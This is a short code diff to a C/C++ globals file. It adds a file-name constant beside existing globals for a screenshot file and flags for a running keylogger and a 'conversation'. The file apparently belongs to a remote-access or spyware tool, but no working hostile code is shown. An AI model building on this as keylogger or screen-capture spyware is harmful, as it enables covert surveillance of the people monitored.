@@ -1,6 +1,7 @@
 #include "globals.h"
 
 const char* filename = "temp.txt";
+const char* cdfilename = "cdtemp.txt";
 const char* scrname = "scr.bmp";
 bool isKeyLoggerRunning = false;
 bool isConversationRunning = false;
